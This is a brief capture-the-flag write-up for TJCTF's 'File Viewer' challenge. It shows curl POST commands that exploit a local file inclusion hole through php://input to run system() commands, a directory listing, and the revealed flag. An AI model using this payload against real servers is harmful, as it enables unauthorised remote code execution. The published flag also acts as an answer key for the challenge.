# File Viewer

Basic LFI Vuln  
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("whoami"); ?>' - www-data
ls -la:  
```
-r--r--r-- 1 root     root       44 May 18 15:32 apple.txt
-r--r--r-- 1 root     root       74 May 24 15:12 grape.txt
dr-xr-xr-x 1 root     root     4096 May 24 15:12 i_wonder_whats_in_here
-r--r--r-- 1 root     root     3012 May 18 15:32 index.html
-r--r--r-- 1 root     root       27 May 18 15:32 orange.txt
-r--r--r-- 1 root     root       49 May 18 15:32 pear.txt
-r--r--r-- 1 root     root       27 May 18 15:32 pinneaple.txt
-r--r--r-- 1 root     root     2532 May 18 15:32 reader.php
-r--r--r-- 1 root     root       22 May 18 15:32 watermelon.txt
```
```php
curl -XPOST 'https://file_viewer.tjctf.org/reader.php?file=php://input' -d '<?php system("cat i_wonder_whats_in_here/* "); ?>'
```
#### tjctf{n1c3_j0b_with_lf1_2_rc3}
